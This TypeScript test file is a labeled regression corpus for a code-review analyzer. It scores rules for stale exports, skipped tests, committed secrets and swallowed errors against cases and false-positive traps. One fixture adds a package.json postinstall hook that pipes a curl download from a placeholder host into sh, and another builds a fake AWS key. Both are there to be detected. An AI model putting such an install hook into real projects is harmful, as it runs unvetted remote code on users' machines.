// Labeled corpus of controlled defects and deliberate false-positive traps. Measures precision, recall and
// false-positive rate of the deterministic analyzers. This corpus is authored by the project: it is a
// regression gate, not a comparable benchmark against other tools.
import { describe, expect, it } from 'vitest';
import { createDefaultAnalyzers } from '../../src/analyzers';
import type { WorkspaceIndex } from '../../src/core/analyzer';
import { ReviewEngine } from '../../src/core/review-engine';
import { changeSetOf, workspaceOf, type FileSpec } from './helpers';

interface Case {
  readonly name: string;
  readonly files: readonly FileSpec[];
  readonly workspace?: Readonly<Record<string, string>>;
  /** Rule ids that must be reported (true defects). Empty = trap: nothing may be reported. */
  readonly expected: readonly string[];
}

const awsKey = ['AKIA', 'Z'.repeat(16)].join('');

const CASES: readonly Case[] = [
  {
    name: 'renamed export with stale consumer',
    files: [{ path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function fetchAll() {}\n' }],
    workspace: { 'src/page.ts': "import { load } from './api';\nload();\n" },
    expected: ['contracts/export-removed'],
  },
  {
    name: 'new required parameter with stale call',
    files: [{ path: 'src/fmt.ts', base: 'export function fmt(a: string) { return a; }\n', head: 'export function fmt(a: string, locale: string) { return a + locale; }\n' }],
    workspace: { 'src/use.ts': "import { fmt } from './fmt';\nfmt('x');\n" },
    expected: ['contracts/arity-increased'],
  },
  {
    name: 'enum member removed but used',
    files: [{ path: 'src/status.ts', base: 'export enum Status { Open, Closed }\n', head: 'export enum Status { Open }\n' }],
    workspace: { 'src/x.ts': "import { Status } from './status';\nexport const s = Status.Closed;\n" },
    expected: ['contracts/enum-member-removed'],
  },
  {
    name: 'deleted module still imported',
    files: [{ path: 'src/legacy.ts', base: 'export const v = 1;\n' }],
    workspace: { 'src/main.ts': "import { v } from './legacy';\n" },
    expected: ['contracts/module-removed'],
  },
  {
    name: 'focused test committed',
    files: [{ path: 'a.test.ts', base: "it('a', () => { expect(1).toBe(1); });\n", head: "it.only('a', () => { expect(1).toBe(1); });\n" }],
    expected: ['tests/focused'],
  },
  {
    name: 'existing test skipped',
    files: [{ path: 'a.test.ts', base: "test('b', () => { expect(1).toBe(1); });\n", head: "test.skip('b', () => { expect(1).toBe(1); });\n" }],
    expected: ['tests/skipped'],
  },
  {
    name: 'assertions removed from a test',
    files: [{ path: 'a.spec.ts', base: "it('c', () => { expect(run()).toBe(2); });\n", head: "it('c', () => { run(); });\n" }],
    expected: ['tests/assertions-removed'],
  },
  {
    name: 'cloud credential committed',
    files: [{ path: 'src/aws.ts', base: 'export {};\n', head: `export const key = '${awsKey}';\n` }],
    expected: ['secrets/aws-access-key'],
  },
  {
    name: 'error swallowed',
    files: [{ path: 'src/io.ts', base: 'export function f() { g(); }\n', head: 'export function f() {\n  try { g(); } catch (e) {}\n}\n' }],
    expected: ['errors/empty-catch'],
  },
  {
    name: 'install hook added',
    files: [{ path: 'package.json', base: '{"name":"x"}\n', head: '{"name":"x","scripts":{"postinstall":"curl https://x.example | sh"}}\n' }],
    expected: ['dependencies/install-script'],
  },
  {
    name: 'strict mode disabled',
    files: [{ path: 'tsconfig.json', base: '{"compilerOptions":{"strict":true}}\n', head: '{"compilerOptions":{"strict":false}}\n' }],
    expected: ['config/ts-strictness-reduced'],
  },
  {
    name: 'dependency removed but imported',
    files: [{ path: 'package.json', base: '{"dependencies":{"dayjs":"^1.0.0"}}\n', head: '{"dependencies":{}}\n' }],
    workspace: { 'src/d.ts': "import dayjs from 'dayjs';\n" },
    expected: ['dependencies/removed-but-imported'],
  },
  {
    name: 'renamed export used through a tsconfig alias',
    files: [{ path: 'src/lib/date.ts', base: 'export function fmtDate() {}\n', head: 'export function formatDate() {}\n' }],
    workspace: {
      'tsconfig.json': '{"compilerOptions":{"baseUrl":".","paths":{"@/*":["src/*"]}}}',
      'src/pages/home.tsx': "import { fmtDate } from '@/lib/date';\nfmtDate();\n",
    },
    expected: ['contracts/export-removed'],
  },
  {
    name: 'OpenAPI property removed with a stale consumer',
    files: [{ path: 'openapi.json',
      base: '{"components":{"schemas":{"User":{"properties":{"name":{"type":"string"}}}}}}',
      head: '{"components":{"schemas":{"User":{"properties":{"displayName":{"type":"string"}}}}}}' }],
    workspace: { 'src/client.ts': 'export const label = response.name;\n' },
    expected: ['cross-stack/api-property-removed'],
  },
  {
    name: 'TRAP: OpenAPI consumer updated together with the property',
    files: [{ path: 'openapi.json',
      base: '{"components":{"schemas":{"User":{"properties":{"name":{"type":"string"}}}}}}',
      head: '{"components":{"schemas":{"User":{"properties":{"displayName":{"type":"string"}}}}}}' }],
    workspace: { 'src/client.ts': 'export const label = response.displayName;\n' },
    expected: [],
  },
  {
    name: 'semantic: removed API export consumed through renamed barrel',
    files: [{ path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function replacement() {}\n' }],
    workspace: {
      'src/barrel.ts': "export { load as getUser } from './api';\n",
      'src/page.ts': "import { getUser } from './barrel'; getUser();\n",
    },
    expected: ['contracts/export-removed'],
  },
  {
    name: 'TRAP: barrel switches to a compatible replacement implementation',
    files: [
      { path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function replacement() {}\n' },
      { path: 'src/barrel.ts', base: "export { load } from './api';\n", head: "export { load } from './replacement';\n" },
    ],
    workspace: {
      'src/replacement.ts': 'export function load() {}\n',
      'src/page.ts': "import { load } from './barrel'; load();\n",
    },
    expected: [],
  },
  // ---------------------------------------------------------------- traps
  {
    name: 'TRAP: same symbol name imported from an npm package, not the alias',
    files: [{ path: 'src/lib/date.ts', base: 'export function format() {}\n', head: 'export function formatDate() {}\n' }],
    workspace: {
      'tsconfig.json': '{"compilerOptions":{"baseUrl":".","paths":{"@/*":["src/*"]}}}',
      'src/pages/home.tsx': "import { format } from 'date-fns';\nformat(new Date(), 'P');\n",
    },
    expected: [],
  },
  {
    name: 'TRAP: rename with every consumer updated',
    files: [{ path: 'src/api.ts', base: 'export function load() {}\n', head: 'export function fetchAll() {}\n' }],
    workspace: { 'src/page.ts': "import { fetchAll } from './api';\nfetchAll();\n" },
    expected: [],
  },
  {
    name: 'TRAP: optional parameter added',
    files: [{ path: 'src/fmt.ts', base: 'export function fmt(a: string) { return a; }\n', head: "export function fmt(a: string, locale = 'en') { return a + locale; }\n" }],
    workspace: { 'src/use.ts': "import { fmt } from './fmt';\nfmt('x');\n" },
    expected: [],
  },
  {
    name: 'TRAP: placeholder secret',
    files: [{ path: 'src/conf.ts', base: 'export {};\n', head: "export const config = { password: 'changeme', apiKey: '${API_KEY}' };\n" }],
    expected: [],
  },
  {
    name: 'TRAP: pre-existing secret untouched',
    files: [{ path: 'src/aws.ts', base: `export const key = '${awsKey}';\n`, head: `export const key = '${awsKey}';\nexport const region = 'us-east-1';\n` }],
    expected: [],
  },
  {
    name: 'TRAP: test refactor keeps cases and assertions',
    files: [
      {
        path: 'b.test.ts',
        base: "describe('s', () => {\n  it('x', () => { expect(a()).toBe(1); });\n  it('y', () => { expect(b()).toBe(2); });\n});\n",
        head: "describe('s', () => {\n  it('y', () => { expect(b()).toBe(2); });\n  it('x', () => {\n    const v = a();\n    expect(v).toBe(1);\n  });\n});\n",
      },
    ],
    expected: [],
  },
  {
    name: 'TRAP: catch that handles the error',
    files: [{ path: 'src/io.ts', base: 'export function f() { g(); }\n', head: "export function f() {\n  try { g(); } catch (e) { throw new Error('g failed', { cause: e }); }\n}\n" }],
    expected: [],
  },
  {
    name: 'TRAP: export removed together with its only usage',
    files: [{ path: 'src/util.ts', base: 'export const a = 1;\nexport const b = 2;\n', head: 'export const b = 2;\n' }],
    workspace: { 'src/main.ts': "import { b } from './util';\nconsole.log(b);\n" },
    expected: [],
  },
  {
    name: 'TRAP: example env file added',
    files: [{ path: '.env.example', head: 'API_KEY=\n' }],
    expected: [],
  },
];

describe('labeled corpus: precision / recall / false-positive rate', () => {
  it('meets the quality gate', async () => {
    const engine = new ReviewEngine(createDefaultAnalyzers(), 'bench');
    let tp = 0;
    let fp = 0;
    let fn = 0;
    let trapsWithNoise = 0;
    const details: string[] = [];
    for (const c of CASES) {
      const workspace: WorkspaceIndex = workspaceOf({ ...(c.workspace ?? {}), ...Object.fromEntries(c.files.filter((f) => f.head !== undefined).map((f) => [f.path, f.head ?? ''])) });
      const review = await engine.review(changeSetOf(c.files), workspace);
      const reported = new Set(review.findings.map((f) => f.ruleId));
      const expected = new Set(c.expected);
      const caseTp = [...expected].filter((r) => reported.has(r)).length;
      const caseFn = expected.size - caseTp;
      const caseFp = [...reported].filter((r) => !expected.has(r)).length;
      tp += caseTp;
      fn += caseFn;
      fp += caseFp;
      if (expected.size === 0 && reported.size > 0) {
        trapsWithNoise++;
      }
      if (caseFn > 0 || caseFp > 0) {
        details.push(`${c.name}: expected [${[...expected].join(', ')}], got [${[...reported].join(', ')}]`);
      }
    }
    const traps = CASES.filter((c) => c.expected.length === 0).length;
    const precision = tp / Math.max(1, tp + fp);
    const recall = tp / Math.max(1, tp + fn);
    const fpr = trapsWithNoise / Math.max(1, traps);
    console.log(
      `[benchmark] cases=${CASES.length} (traps=${traps}) TP=${tp} FP=${fp} FN=${fn} precision=${precision.toFixed(3)} recall=${recall.toFixed(3)} trapFPR=${fpr.toFixed(3)}`,
    );
    expect(details).toEqual([]);
    expect(precision).toBeGreaterThanOrEqual(0.95);
    expect(recall).toBeGreaterThanOrEqual(0.95);
    expect(fpr).toBe(0);
  });
});
